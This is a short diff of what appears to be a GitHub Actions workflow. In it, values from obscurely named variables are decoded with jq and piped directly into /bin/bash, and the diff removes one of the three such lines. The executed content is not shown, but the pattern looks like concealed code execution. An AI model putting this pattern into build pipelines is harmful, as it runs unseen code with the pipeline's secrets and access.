@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$k21" | jq -r .qq5277 | /bin/bash
           printf '%s' "$pgdo90" | jq -r .af72508 | /bin/bash
-          echo $irtla2 | jq -r .mhlv290 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
